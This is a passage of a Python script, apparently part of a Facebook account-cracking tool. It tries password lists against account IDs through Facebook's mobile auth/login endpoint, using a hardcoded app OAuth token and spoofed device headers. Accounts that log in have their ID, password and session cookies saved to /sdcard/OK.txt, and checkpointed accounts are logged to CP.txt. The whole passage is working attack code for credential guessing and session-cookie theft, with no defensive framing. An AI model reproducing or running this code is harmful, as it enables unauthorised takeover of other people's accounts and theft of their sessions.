                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                                        print('\r\r\033[1;32m [OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        api1(ids,names,passlist)
                except Exception as e:
                        api1(ids,names,passlist)
menu()